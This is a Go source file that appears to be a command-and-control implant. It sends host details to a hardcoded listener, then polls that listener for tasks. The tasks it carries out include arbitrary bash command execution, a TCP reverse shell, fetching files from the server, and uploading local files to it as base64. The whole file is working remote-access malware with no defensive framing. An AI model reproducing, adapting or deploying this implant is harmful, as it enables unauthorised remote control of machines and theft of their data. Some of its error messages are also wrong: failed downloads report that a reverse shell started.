package main

import (
	"runtime"
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/user"
	"os/exec"
	"strings"
	"time"
)

type Task struct {
	ID          int                    `json:"id"`
	Name        string                 `json:"name"`
	Description string                 `json:"description"`
	Action      string                 `json:"action"`
	Args        map[string]interface{} `json:"args"`
	Output      interface{}            `json:"output"`
	Success     interface{}            `json:"success"`
	CreatedAt   string                 `json:"created_at"`
	FinishedAt  string                 `json:"finished_at"`
	Device      int                    `json:"device"`
}

var name, LISTENER_IP, LISTENER_PORT, URL string
var sleep_time int = 5
var output = ""
var success = false


func system_info() []byte{
	// get system info
	hostname, err := os.Hostname()

	if err != nil {
		hostname = "unknown"
	}

	username := "unknown"

	user, err := user.Current()

	if err == nil {
		username = user.Username
	}
	// Get the IP address of the current machine
    address := ""

    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
		address = "unknown"
    } else {
    	defer conn.Close()
		address = conn.LocalAddr().(*net.UDPAddr).IP.String()
	}

	data, err := json.Marshal(map[string]any{
		"address":      address,
		"hostname":     hostname,
		"os": 		    runtime.GOOS,
		"architecture": runtime.GOARCH,
		"username":     username,
		"admin":        false,
		"stager":       1,
	})

	return data

}

func run_command(command string){
	cmd := exec.Command("bash", "-c", command)
	stdout, err := cmd.Output()
	output, success = string(stdout), err == nil
}

func reverse_shell(address string, port string){
	conn, _ := net.Dial("tcp", address+":"+port)
	for {
 
	   message, err := bufio.NewReader(conn).ReadString('\n')
 
	   if err != nil {
		  return
	   }


	   // split the message into command and arguments
	   parts := strings.Fields(message)
	   cmd := parts[0]
	   args := parts[1:]

	   // run the command
	   out, err := exec.Command(cmd, args...).Output()
 
	   if err != nil {
		  fmt.Fprintf(conn, "%s\n",err)
	   }
 
	   fmt.Fprintf(conn, "%s\n",out)
 
	}
}


func download_file(task_name string, path string){
	// Get the file from the server
	resp, err := http.Get(URL + "/download/" + task_name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Reverse shell started.", true
		return
	}

	defer resp.Body.Close()

	// Create the file locally
	file, err := os.Create(path)
	if err != nil {
		output, success = "Reverse shell started.", true
		return
	}

	// Write the file
	_, err = io.Copy(file, resp.Body)

	if err != nil {
		output, success = "Reverse shell started.", true
		return
	}

	output, success = "File downloaded.", true
}

func upload_file(file_name string) {
	// open the file and encode it to base64
	file, err := os.Open(file_name)

	if err != nil {
		output, success = "Could not open file.", false
		return
	}

	defer file.Close()

	fileInfo, _ := file.Stat()
	var size int64 = fileInfo.Size()
	bytes := make([]byte, size)

	buffer := bufio.NewReader(file)
	_, err = buffer.Read(bytes)

	if err != nil {
		output, success = "Could not read file.", false
		return
	}

	output, success = base64.StdEncoding.EncodeToString(bytes), true
}

func main() {
	name = ""
	LISTENER_IP = "192.168.2.184"
	LISTENER_PORT = "9999"
	URL = "http://" + LISTENER_IP + ":" + LISTENER_PORT
	// Set up the HTTP client
	client := &http.Client{}
	
	data := system_info()

	fmt.Println("Connecting to the l1stener...")
	resp, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))

	if err != nil {
		fmt.Println("Could not connect to the listener.")
		os.Exit(1)
	} else {
		fmt.Println("Connected to the listener.")
	}

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	name = result["name"].(string)

	for {
		time.Sleep(time.Duration(sleep_time) * time.Second)
		// Get the tasks
		resp, err := client.Get(URL + "/tasks/" + name)
		if err != nil {
			fmt.Println("Could not fetch tasks.")
			continue
		}

		defer resp.Body.Close()
		respBytes, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			fmt.Println("Could not read response body.")
			continue
		}

		var tasks []Task
		err = json.Unmarshal(respBytes, &tasks)

		if err != nil {
			fmt.Println("Could not unmarshal response body.")
			continue
		}

		for _, task := range tasks {

			switch task.Action {
			case "rce":
				run_command(task.Args["cmd"].(string))
			case "dir":
				run_command("ls " + task.Args["dir"].(string))
			case "reverse-shell":
				go reverse_shell(task.Args["address"].(string), task.Args["port"].(string))
				output, success = "Reverse shell started.", true
			case "download":
				upload_file(task.Args["target_path"].(string))
			case "upload":
				download_file(task.Name, task.Args["target_path"].(string))
			default:
				output, success = "Invalid action.", false
			}
			fmt.Println("Task: ", task.ID, "Output: ", output, "Success: ", success)
			data, err := json.Marshal(map[string]any{
				"task":    task.ID,
				"output":  output,
				"success": success,
			})

			if err != nil {
				fmt.Println("Could not marshal JSON.")
				continue
			}

			client.Post(URL+"/finish/"+name, "application/json", bytes.NewBuffer(data))
		}
	}
}

